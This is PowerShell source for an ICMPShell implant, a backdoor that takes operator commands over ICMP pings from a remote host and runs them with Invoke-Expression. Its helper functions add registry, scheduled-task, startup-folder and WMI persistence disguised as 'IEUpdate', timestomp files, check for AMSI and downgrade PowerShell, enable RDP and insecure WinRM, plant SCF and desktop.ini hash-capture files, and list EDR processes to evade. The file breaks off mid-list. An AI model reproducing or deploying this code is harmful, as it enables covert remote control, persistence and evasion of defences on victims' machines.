class ICMPShell
{
    [String]$payload
    [Byte[]]$shellcode
    [Int]$PID
    [String]$PSVersion
    [String]$IPAddress
    [String[]]$FallbackIPs
    [PSObject]$ICMPClient
    [PSObject]$PingOptions
    [String]$Key = "PWN"
    [Int]$Delay = 5
    [Int]$BufferSize = 128
    [Int]$FallbackLimit = 20;
    [Int]$Missed = 0;
    [String[]]$Authenticated
    [PSObject[]]$Info
    [String[]]$Options
    [Boolean]$ProchandlerLoaded
    ICMPShell([String]$IPAddress, [String]$Key, [Int]$PIDD, [String]$PSVersion, [String]$payload){
        $this.ICMPClient = New-Object System.Net.NetworkInformation.Ping;
        $this.PingOptions = New-Object System.Net.NetworkInformation.PingOptions;
        $this.Authenticated = @();
        $this.PingOptions.DontFragment = $True;
        $this.IPAddress = $IPAddress;
        $this.FallbackIPs = @($IPAddress);
        $this.Key = $Key;
        $this.PID = $PIDD;
        $this.PSVersion = $PSVersion;
        $this.payload = $payload;
        $this.ProchandlerLoaded = $false;
        $this.Options = $this.GetOptions();
    }
    [ICMPShell]SetFallbackIPs([String[]]$IPs){
        $IPs += $this.IPAddress;
        $this.FallbackIPs = $IPs|Sort -Unique;
        return $this;
    }
    [ICMPShell]SetFallbackNetwork([String]$IPAddress, [String]$subnetMask){
        $IPs = $this.GetSubnet($IPAddress, $subnetMask);
        $IPs += $this.IPAddress;
        $this.FallbackIPs = $IPs|Sort -Unique;
        return $this;
    }
    [String]MaskToBinary([String]$subnetMask)
    {
        $binaryMask = $null;
        $sections = @();
        $sections += $subnetMask.split(".");
        $sections|%{
            if ($binaryMask -ne $null){
                $binaryMask = $binaryMask+".";
            }
            $binaryMask = $binaryMask+($this.IPToBinary($_));
        }
        return $binaryMask
    }
    [String]IPToBinary([String]$IP){
        return ($IP.Trim().Split('.')|%{
            [System.Convert]::ToString([byte]$_, 2).PadLeft(8, '0')
        }) -join '';
    }
    [String]BinaryToIP([String]$binary){
        $binary = $binary -replace '\s+';
        [int]$numberOfBytes = $binary.Length / 8;
        $bytes = @(foreach ($i in 0..($numberOfBytes-1))
        {
            [System.Convert]::ToByte($binary.Substring(($i * 8), 8), 2);
        });
        return $bytes -join '.';
    }
    [String[]]GetSubnet([String]$IPAddress, [String]$fallbackCIDR){
        $results = @();
        $binaryMask = ($this.MaskToBinary($fallbackCIDR)).replace(".", "");
        $netSection = $binaryMask.replace("1", "");
        $binaryIP = ($this.IPToBinary($IPAddress)).Replace(".", "");
        $IPNetSection = $binaryIP.substring(0, (32 - $netSection.length));
        $firstAddress = $netSection -replace "0$", "1";
        $lastAddress = ($netSection -replace "0", "1") -replace "1$", "0";
        [int64]$startInt = [System.Convert]::ToInt64(($IPNetSection + $firstAddress), 2);
        [int64]$endInt = [System.Convert]::ToInt64(($IPNetSection + $lastAddress), 2);
        for ($binaryIP = $startInt; $binaryIP -le $endInt; $binaryIP++){
            $results += $this.BinaryToIP(
                    [System.Convert]::ToString($binaryIP, 2).PadLeft(32, '0')
            );
        }
        return $results;
    }
    [PSObject]Send([Byte[]]$output){
        if($output -eq $null){
            $output = $this.GetBytes('');
        }
        return $this.ICMPClient.Send($this.IPAddress, 60 * 100, $output, $this.PingOptions);
    }
    [PSObject]SendString([String]$output){
        return $this.Send($this.GetBytes($output));
    }
    [String]GetString([Byte[]]$bytes){
        return ([text.encoding]::ASCII).GetString($bytes);
    }
    [Byte[]]GetBytes([String]$string){
        return ([text.encoding]::ASCII).GetBytes($string);
    }
    [String]GetResponse([Byte[]]$output){
        $reply = $this.Send($output);
        $response = "";
        if($reply.Buffer){
            $response = $this.GetString($reply.Buffer);
        } else {
            $this.FallbackCheck();
        }
        return $response;
    }
    [ICMPShell]FallbackCheck(){
        $this.Missed += 1;
        if($this.Missed -gt $this.FallbackLimit){
            $idx = [Array]::indexof($this.FallbackIPs, $this.IPAddress);
            if($idx -ge $this.FallbackIPs.Length-1){
                $this.IPAddress = $this.FallbackIPs[0];
            } else {
                $this.IPAddress = $this.FallbackIPs[$idx+1];
            }
            $this.Missed = 0;
        }
        return $this;
    }
    [String]InvokeCommand([String]$reply){
        $result = "";
        try {
            [String[]]$cArgs = $reply.Trim().Split(" ");
            [String]$cCmd = $cArgs[0];
            if($this.Options -contains $cCmd)
            {
                if($cArgs.Length -gt 1)
                {
                    [String[]]$cCmdArgs = $cArgs[1..$cArgs.Length];
                    $result += ($this|%{$_.$cCmd.Invoke($cCmdArgs)} 2>&1 | Out-String);
                } else {
                    $result += ($this|%{$_.$cCmd.Invoke()} 2>&1 | Out-String);
                }
            } else {
                try {
                    $result += (Invoke-Expression -Command $reply 2>&1 | Out-String);
                } catch {
                    $result += $error[0];
                }
            }
        } catch {
            $result += $error[0];
        }
        return $result;
    }
    [ICMPShell]InvokeShell(){
        while($true)
        {
            if ($this.Authenticated -notcontains $this.IPAddress -and $this.Key -ne "")
            {
                $reply = $this.GetResponse($this.GetBytes('AUTH'));
                if ($reply -match $this.Key)
                {
                    $this.Authenticated += $this.IPAddress;
                    $this.SendString("Context: $( $env:username ) Host: $( $env:computername )`n`n")|Out-Null;
                    $this.SendString("Type 'Help' for options.`n`n")|Out-Null;
                    $this.SendString("PS $( (Get-Location).Path )> ")|Out-Null;
                }
                else
                {
                    $this.FallbackCheck();
                }
            }
            else
            {
                $reply = $this.GetResponse($this.GetBytes(''));
                if ($reply -ne "")
                {
                    $this.Missed = 0;
                    $result = "";
                    $result = $this.InvokeCommand($reply); #
                    $sendbytes = $this.GetBytes($result);
                    $index = [math]::floor($sendbytes.length/$this.BufferSize);
                    $i = 0;
                    if ($sendbytes.length -gt $this.BufferSize)
                    {
                        while ($i -lt $index)
                        {
                            $sendbytes2 = $sendbytes[($i*$this.BufferSize)..(($i + 1)*$this.BufferSize - 1)];
                            $this.Send($sendbytes2)|Out-Null;
                            $i += 1;
                        }
                        $remainingindex = $sendbytes.Length % $this.BufferSize;
                        if ($remainingindex -ne 0)
                        {
                            $sendbytes2 = $sendbytes[($i*$this.BufferSize)..($sendbytes.Length)];
                            $this.Send($sendbytes2)|Out-Null;
                        }
                    }
                    else
                    {
                        $this.Send($sendbytes)|Out-Null;
                    }
                    $this.SendString("PS $( (Get-Location).Path )> ")|Out-Null;
                }
            }
            Start-Sleep -Seconds $this.Delay;
        }
        return $this;
    }
    [Boolean]TestWin32(){
        return [IntPtr]::size -eq 4;
    }
    [Boolean]TestWin64(){
        return [IntPtr]::size -eq 8;
    }
    [Boolean]TestWow64(){
        return $this.TestWin32() -and ( test-path env:\PROCESSOR_ARCHITEW6432);
    }
    [String]CheckArchitecture(){
        $result = "";
        if ($this.TestWin64()) {
            $result += "64bit implant running on 64bit machine`n";
        }
        elseif (($this.TestWin32()) -and (-Not ($this.TestWow64()))) {
            $result += "32bit running on 32bit machine`n";
        }
        elseif (($this.TestWin32()) -and ($this.TestWow64())) {
            $global:ImpUpgrade = $True;
            $result += "32bit implant running on a 64bit machine, use StartAnotherImplant to upgrade to 64bit`n";
        }
        else {
            $result += "Unknown Architecture Detected`n";
        }
        Get-Process -id $this.PID -module|%{if($_.modulename -eq "amsi.dll") {
            $result += "`n[+] AMSI Detected. Migrate to avoid the Anti-Malware Scan Interface (AMSI)`n";
        }}

        return $result;
    }
    [PSObject]GetProxy(){
        return Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings";
    }
    [String]CheckVersionTwo(){
        $result = "";
        $psver = $this.PSVersion;
        if ($psver -ne '2') {
            $result += "`n[+] Powershell version $psver detected. Run Inject-Shellcode with the v2 Shellcode`n";
            $result += "[+] Warning AMSI, Constrained Mode, ScriptBlock/Module Logging could be enabled`n";
        }
        return $result;
    }
    [String]StartAnotherImplant(){
        $result = "";
        if (($p = Get-Process | ? {$_.id -eq $pid}).name -ne "powershell") {
            $result += "Process is not powershell, try running migrate -x86 or migrate -x64"
        } else {
            if ($global:ImpUpgrade) {
                $result += "Start-Process Upgrade via CMD"
                start-process -windowstyle hidden cmd -args "/c `"$env:windir\sysnative\windowspowershell\v1.0\$($this.payload)`""
            } else {
                $result += "Start-Process via CMD"
                start-process -windowstyle hidden cmd -args "/c $($this.payload)"
            }
        }
        return $result;
    }
    [String]InvokeDowngradeAttack(){
        $this.payload = $this.payload -replace "-exec", "-v 2 -exec";
        return $this.StartAnotherImplant();
    }
    [Boolean]TestAdministrator()
    {
        $user = [Security.Principal.WindowsIdentity]::GetCurrent();
        return (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator);
    }
    [String]CreateShortcut([String]$SourceExe, [String]$ArgumentsToSourceExe, [String]$DestinationPath)
    {
        $WshShell = New-Object -comObject WScript.Shell;
        $Shortcut = $WshShell.CreateShortcut($DestinationPath);
        $Shortcut.TargetPath = $SourceExe
        $Shortcut.Arguments = $ArgumentsToSourceExe
        $Shortcut.WindowStyle = 7
        $Shortcut.Save()
        return "[+] Shortcut created: $DestinationPath";
    }
    [String]EnableRDP()
    {
        $result = "";
        if ($this.TestAdministrator()) {
            set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
            set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
            $psver = $this.PSVersion;
            if ($psver -ne '2')
            {
                Get-NetFirewallRule -DisplayName "Remote Desktop*" | Set-NetFirewallRule -enabled true
            } else {
                netsh advfirewall firewall add rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389
            }
            $result = "Success";
        } else {
            $result = "You are not elevated to Administator ";
        }
        return $result;
    }
    [String]DisableRDP()
    {
        $result = "";
        if ($this.TestAdministrator()) {
            set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 1
            set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
            $psver = $this.PSVersion;
            if ($psver -ne '2')
            {
                Get-NetFirewallRule -DisplayName "Remote Desktop*" | Set-NetFirewallRule -enabled false
            } else {
                netsh advfirewall firewall del rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389
            }
            $result = "Success";
        } else {
            $result = "You are not elevated to Administator ";
        }
        return $result;
    }
    [String]WriteSCFFile([String]$IPaddress, [String]$Location)
    {
        "[Shell]" >$Location\~T0P0092.jpg.scf
        "Command=2" >> $Location\~T0P0092.jpg.scf;
        "IconFile=\\$IPaddress\remote.ico" >> $Location\~T0P0092.jpg.scf;
        "[Taskbar]" >> $Location\~T0P0092.jpg.scf;
        "Command=ToggleDesktop" >> $Location\~T0P0092.jpg.scf;
        return "Written SCF File: $Location\~T0P0092.jpg.scf";
    }
    [String]WriteINIFile([String]$IPaddress, [String]$Location)
    {
        "[.ShellClassInfo]" > $Location\desktop.ini
        "IconResource=\\$IPAddress\resource.dll" >> $Location\desktop.ini
        $a = Get-item $Location\desktop.ini -Force; $a.Attributes="Hidden"
        return "Written INI File: $Location\desktop.ini";
    }
    [String]InstallPersistence([Int]$Method)
    {
        $result = "";
        if (!$Method){$Method=1}
        if ($Method -eq 1) {
            Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777 -value "$($this.payload)"
            Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate -value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\).Wallpaper777"
            $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate
            $registrykey2 = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777
            if (($registrykey.IEUpdate) -and ($registrykey2.Wallpaper777)) {
                $result = "Successfully installed persistence: `n Regkey: HKCU\Software\Microsoft\Windows\currentversion\run\IEUpdate `n Regkey2: HKCU\Software\Microsoft\Windows\currentversion\themes\Wallpaper777"
            } else {
                $result = "Error installing persistence";
            }
        }
        if ($Method -eq 2) {
            Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper555 -value "$($this.payload)"
            $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper555
            schtasks.exe /create /sc minute /mo 240 /tn "IEUpdate" /tr "powershell -exec bypass -Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\).Wallpaper555"
            If ($registrykey.Wallpaper555) {
                $result = "Created scheduled task persistence every 4 hours";
            }
        }
        if ($Method -eq 3) {
            Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper666 -value "$($this.payload)"
            $registrykey2 = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper666
            $SourceExe = "powershell.exe"
            $ArgumentsToSourceExe = "-exec bypass -Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\).Wallpaper666"
            $DestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\IEUpdate.lnk"
            $WshShell = New-Object -comObject WScript.Shell
            $Shortcut = $WshShell.CreateShortcut($DestinationPath)
            $Shortcut.TargetPath = $SourceExe
            $Shortcut.Arguments = $ArgumentsToSourceExe
            $Shortcut.WindowStyle = 7
            $Shortcut.Save()
            If ((Test-Path $DestinationPath) -and ($registrykey2.Wallpaper666)) {
                $result = "Created StartUp folder persistence and added RegKey`n Regkey: HKCU\Software\Microsoft\Windows\currentversion\themes\Wallpaper666"
                $result += " LNK File: $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\IEUpdate.lnk"
            } else {
                $result = "Error installing StartUp folder persistence";
            }
        }
        return $result;
    }
    [String]InstallExePersistence(){
        $result = "";
        if (Test-Path "$env:Temp\Winlogon.exe") {
            $SourceEXE = "rundll32.exe"
            $ArgumentsToSourceExe = "shell32.dll,ShellExec_RunDLL %temp%\winlogon.exe"
            $DestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinLogon.lnk"
            $WshShell = New-Object -comObject WScript.Shell
            $Shortcut = $WshShell.CreateShortcut($DestinationPath)
            $Shortcut.TargetPath = $SourceEXE
            $Shortcut.Arguments = $ArgumentsToSourceExe
            $Shortcut.WindowStyle = 7
            $Shortcut.Save()
            $this.TimeStomp($DestinationPath ,"01/03/2008 12:12 pm");
            $this.TimeStomp("$env:Temp\Winlogon.exe", "01/03/2008 12:12 pm");
            If ((Test-Path $DestinationPath) -and (Test-Path "$env:Temp\Winlogon.exe")) {
                $result = "Created StartUp file Exe persistence: $DestinationPath"
            } else {
                $result = "Error installing StartUp Exe persistence"
                $result += "Upload EXE to $env:Temp\Winlogon.exe"
            }
        } else {
            $result = "Error installing StartUp Exe persistence"
            $result += "Upload EXE to $env:Temp\Winlogon.exe"
        }
        return $result;
    }
    [String]RemoveExePersistence(){
        $result = "";
        $DestinationPath1 = "$env:Temp\winlogon.exe"
        If (Test-Path $DestinationPath1) {
            Remove-Item -Force $DestinationPath1
        }
        $DestinationPath2 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinLogon.lnk"
        If (Test-Path $DestinationPath2) {
            Remove-Item -Force $DestinationPath2
        }
        If ((Test-Path $DestinationPath1) -or ((Test-Path $DestinationPath2))) {
            $result = "Unable to Remove Persistence"
        } else {
            $result = "Persistence Removed"
        }
        return $result;
    }
    [String]CheckWMI(){
        $result = @();
        $result += "Showing All Root Event Filters";
        $result += Get-WmiObject -Namespace root/subscription -Class __EventFilter;

        $result += "Showing All CommandLine Event Consumers";
        $result += Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer;

        $result += "Showing All Filter to Consumer Bindings";
        $result += Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding;
        return $result -join "`n";
    }
    [String]RemoveWMIPersistence([String]$EventFilterName, [String]$EventConsumerName){
        $result = @();
        $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventConsumerName'"
        $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventFilterName'"
        $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
        $FilterConsumerBindingToCleanup | Remove-WmiObject
        $EventConsumerToCleanup | Remove-WmiObject
        $EventFilterToCleanup | Remove-WmiObject
        $result += $this.CheckWMI();
        return $result -join "`n";
    }
    [String]InstallWMIPersistence([String]$EventFilterName, [String]$EventConsumerName){
        $result = @();

        $EventFilterArgs = @{
            EventNamespace = 'root/cimv2'
            Name = $EventFilterName
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
            QueryLanguage = 'WQL'
        }

        $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs
        $CommandLineConsumerArgs = @{
            Name = $EventConsumerName
            CommandLineTemplate = $this.payload;
        }
        $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

        $FilterToConsumerArgs = @{
            Filter = $Filter
            Consumer = $Consumer
        }
        $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs

        $EventCheck = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventFilterName'"
        if ($EventCheck -ne $null) {
            $result += "Event Filter $EventFilterName successfully written to host"
        }

        $ConsumerCheck = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventConsumerName'"
        if ($ConsumerCheck -ne $null) {
            $result += "Event Consumer $EventConsumerName successfully written to host"
        }

        $BindingCheck = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__eventfilter.name='$EventFilterName'"""
        if ($BindingCheck -ne $null){
            $result += "Filter To Consumer Binding successfully written to host"
        }
        return $result -join "`n";
    }
    [String]RemovePersistence([Int]$Method)
    {
        $result = "";
        if (!$Method){$Method=1}
            if ($Method -eq 1) {
                Remove-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777
                Remove-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate
                $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate
                $registrykey2 = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777
                if (($registrykey -eq $null) -and ($registrykey2 -eq $null)) {
                $result += "Successfully removed persistence from registry!"
                $error.clear()
                } else {
                $result += "Error removing persistence, remove registry keys manually!"
                $error.clear()
            }
            if ($Method -eq 2) {
                schtasks.exe /delete /tn IEUpdate /F
                Remove-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper555
                $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper555
                if ($registrykey -eq $null) {
                    $result += "Successfully removed persistence from registry!"
                    $result += "Removed scheduled task persistence"
                }else {
                    $result += "Error removing SchTasks persistence"
                }
            }
            if ($Method -eq 3) {
                $DestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\IEUpdate.lnk"
                Remove-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper666
                $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper666
                Remove-Item "$env:APPDATA\Microsoft\Windows\StartMenu\Programs\Startup\IEUpdate.lnk"
                If ((Test-Path $DestinationPath) -and ($registrykey.Wallpaper666)) {
                    $result += "Removed StartUp folder persistence"
                }else {
                    $result += "Error installing StartUp folder persistence"
                }
            }
        }
        return $result;
    }
    [PSObject]DownloadFile([String]$SourceURL,[String]$TargetFilePath){
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};
        return (Get-Webclient).DownloadFile($SourceURL, $TargetFilePath);
    }
    [ICMPShell]Unzip([String]$SourceFile, [String]$Destination)
    {
        $shell = new-object -com shell.application
        $zip = $shell.NameSpace($SourceFile)
        foreach($item in $zip.items())
        {
            $shell.Namespace($destination).copyhere($Destination)
        }
        return $this;
    }
    [ICMPShell]ConvertFromBase64([string]$SourceFilePath,[string]$TargetFilePath)
    {
        $SourceFilePath = Resolve-PathSafe $SourceFilePath
        $TargetFilePath = Resolve-PathSafe $TargetFilePath
        $bbufferSize = 90000
        $buffer = New-Object char[] $bbufferSize
        $reader = [System.IO.File]::OpenText($SourceFilePath)
        $writer = [System.IO.File]::OpenWrite($TargetFilePath)
        $bytesRead = 0
        do
        {
            $bytesRead = $reader.Read($buffer, 0, $bbufferSize);
            $bytes = [Convert]::FromBase64CharArray($buffer, 0, $bytesRead);
            $writer.Write($bytes, 0, $bytes.Length);
        } while ($bytesRead -eq $bbufferSize);

        $reader.Dispose()
        $writer.Dispose()
        return $this;
    }
    [String]SecureDelete([string]$Destination)
    {
        $result = "";
        try {
            $file = Get-Item $Destination -Force
            $file.Attributes = "Normal"
            $content = New-Object Byte[] $file.length
            (New-Object Random).NextBytes($content)
            [IO.File]::WriteAllBytes($file,$content)
            Remove-Item $Destination -Force
            $result = "Success";
        } catch {
            $result = $error[0]
        }
        return $result;
    }
    [ICMPShell]UnHideFile([String]$file) {
        $f = Get-Item "$file" -Force
        $a = $f.Attributes
        $a = "Normal"
        $f.Attributes = $a
        return $this;
    }
    [ICMPShell]HideFile([String]$file) {
        $f = Get-Item "$file" -Force
        $a = $f.Attributes
        $a = "Hidden,System"
        $f.Attributes = $a
        return $this;
    }
    [ICMPShell]EnableWinRM([string]$username,[string]$password,[string]$computer) {
        $PSS = ConvertTo-SecureString $password -AsPlainText -Force
        $getcreds = new-object system.management.automation.PSCredential $username,$PSS
        Invoke-command -computer localhost -credential $getcreds -scriptblock { set-itemproperty -path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -Type Dword}
        Invoke-Command -Computer localhost -Credential $getcreds -Scriptblock {Set-Item WSMan:localhost\client\trustedhosts -value * -force}
        $command = "cmd /c powershell.exe -c Set-WSManQuickConfig -Force;Set-Item WSMan:\localhost\Service\Auth\Basic -Value $True;Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $True; Register-PSSessionConfiguration -Name Microsoft.PowerShell -Force"
        Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $computer -Credential $getcreds -ArgumentList $command
        return $this;
    }
    [ICMPShell]DisableWinRM([string]$username,[string]$password,[string]$computer) {
        $command = "cmd /c powershell.exe -c Set-Item WSMan:\localhost\Service\Auth\Basic -Value $False;Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $False;winrm delete winrm/config/listener?address=*+transport=HTTP;Stop-Service -force winrm;Set-Service -Name winrm -StartupType Disabled"
        $PSS = ConvertTo-SecureString $password -AsPlainText -Force
        $getcreds = new-object system.management.automation.PSCredential $username,$PSS
        Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $computer -Credential $getcreds -ArgumentList $command
        return $this;
    }
    [String]WMICommand([string]$username,[string]$password,[string]$computer,[string]$command) {
        $result = "";
        $PSS = ConvertTo-SecureString $password -AsPlainText -Force
        $getcreds = new-object system.management.automation.PSCredential $username,$PSS
        $WMIResult = Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $computer -Credential $getcreds -ArgumentList $command
        If ($WMIResult.Returnvalue -eq 0) {
            $result = "Executed WMI Command with Sucess: $Command `n"
        } else {
            $result = "WMI Command Failed - Could be due to permissions or UAC is enabled on the remote host, Try mounting the C$ share to check administrative access to the host"
        }
        return $result;
    }
    [PSObject[]]GetProcess(){
        return gwmi win32_process|select name,processid,@{name="username";expression={$_.getowner().domain+"\"+$_.getowner().user}}|sort username,name;
    }
    [PSObject[]]GetProcessFull() {
        $result = @();
        [System.Diagnostics.Process[]] $processes64bit = @()
        [System.Diagnostics.Process[]] $processes32bit = @()
        $owners = @{}
        $fp = gwmi win32_process;

        ForEach ($r in $fp) {
            try {
                $owners[$r.handle] = $r.getowner().user
            } catch {}
        }

        $AllProcesses = @()
            if ($this.TestWin64()) {
                $result += "64bit implant running on 64bit machine"
            }

        if ($this.TestWin64()) {
            foreach($process in get-process) {
            $modules = $process.modules
            foreach($module in $modules) {
                $file = [System.IO.Path]::GetFileName($module.FileName).ToLower()
                if($file -eq "wow64.dll") {
                    $processes32bit += $process
                    $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, Username
                    $pobject.Id = $process.Id
                    $pobject.StartTime = $process.StartTime
                    $pobject.Name = $process.Name
                    $pobject.Path = $process.Path
                    $pobject.Arch = "x86"
                    $pobject.UserName = $owners[$process.Id.tostring()]
                    $AllProcesses += $pobject
                    break
                }
            }

            if(!($processes32bit -contains $process)) {
                $processes64bit += $process
                $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, UserName
                $pobject.Id = $process.Id
                $pobject.StartTime = $process.StartTime
                $pobject.Name = $process.Name
                $pobject.Path = $process.Path
                $pobject.Arch = "x64"
                $pobject.UserName = $owners[$process.Id.tostring()]
                $AllProcesses += $pobject
            }
        }
        }
        elseif (($this.TestWin32()) -and (-Not ($this.TestWow64()))) {
        foreach($process in get-process) {
            $processes32bit += $process
            $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, Username
            $pobject.Id = $process.Id
            $pobject.StartTime = $process.StartTime
            $pobject.Name = $process.Name
            $pobject.Path = $process.Path
            $pobject.Arch = "x86"
            $pobject.UserName = $owners[$process.Id.tostring()]
            $AllProcesses += $pobject
        }
        }
        elseif (($this.TestWin32()) -and ($this.TestWow64())) {
            foreach($process in get-process) {
            $modules = $process.modules
            foreach($module in $modules) {
                $file = [System.IO.Path]::GetFileName($module.FileName).ToLower()
                if($file -eq "wow64.dll") {
                    $processes32bit += $process
                    $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, Username
                    $pobject.Id = $process.Id
                    $pobject.StartTime = $process.StartTime
                    $pobject.Name = $process.Name
                    $pobject.Path = $process.Path
                    $pobject.Arch = "x86"
                    $pobject.UserName = $owners[$process.Id.tostring()]
                    $AllProcesses += $pobject
                    break
                }
            }

            if(!($processes32bit -contains $process)) {
                $processes64bit += $process
                $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, UserName
                $pobject.Id = $process.Id
                $pobject.StartTime = $process.starttime
                $pobject.Name = $process.Name
                $pobject.Path = $process.Path
                $pobject.Arch = "x64"
                $pobject.UserName = $owners[$process.Id.tostring()]
                $AllProcesses += $pobject
            }
        }
        } else {
            $result += "Unknown Architecture"
        }

        $result += $AllProcesses|Select ID, UserName, Arch, Name, Path, StartTime | format-table -auto
        return $result;
    }
    [PSObject[]]InvokeNetstat(){
        $result = @();
        try {
            $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
            $Connections = $TCPProperties.GetActiveTcpListeners()
            foreach($Connection in $Connections) {
                if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }
                $OutputObj = New-Object -TypeName PSobject
                $OutputObj | Add-Member -MemberType NoteProperty -Name "LocalAddress" -Value $connection.Address
                $OutputObj | Add-Member -MemberType NoteProperty -Name "ListeningPort" -Value $Connection.Port
                $OutputObj | Add-Member -MemberType NoteProperty -Name "IPV4Or6" -Value $IPType
                $result += $OutputObj;
            }

        } catch {
            $result += "Failed to get listening connections. $_"
        }
        return $result;
    }
   [String]DownloadString([string]$url){
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};
        return (new-object system.net.webclient).downloadstring($url);
    }
    [ICMPShell]TimeStomp([String]$path, [DateTime]$stamp) {
        # Get-Date -Date "6/25/2019 12:30:22"
        $date = Get-Date -Date $stamp;
        $file=(gi $path -force);
        $file.LastWriteTime=$date;
        $file.LastAccessTime=$date;
        $file.CreationTime=$date;
        return $this;
    }
    [String]GetAllServices(){
        $results = @();
        $Keys = Get-ChildItem HKLM:\System\CurrentControlSet\services; $Items = $Keys | Foreach-Object {Get-ItemProperty $_.PsPath }
        ForEach ($Item in $Items) {$n=$Item.PSChildName;$i=$Item.ImagePath;$d=$Item.Description; $results += "Name: $n `nImagePath: $i `nDescription: $d`n"}
        return $results -join "`n";
    }
    [PSObject[]]GetAllFirewallRules() {
        $Rules=(New-object -comObject HNetCfg.FwPolicy2).rules
        return $Rules;
    }
    [String]InvokeEDRChecker()
    {
        $results = @();
        $edr_list = @('authtap',
                  'avecto',
                  'carbon',
                  'cb.exe',
                  'crowd',
                  'csagent',
                  'csfalcon',
                  'csshell',
                  'cyclorama',
                  'cylance',
                  'cyoptics',
                  'cyupdate',
                  'defendpoint',
                  'eectrl',
                  'esensor',
                  'groundling',
                  'inspector',
                  'lacuna',
                  'morphisec',
                  'msascuil',
                  'msmpeng',
                  'nissrv',
                  'pgeposervice',
                  'pgsystemtray',
                  'privilegeguard',
                  'procwall',
                  'protectorservice'
                  'redcloak',
                  'securityhealthservice',
                  'semlaunchsvc'
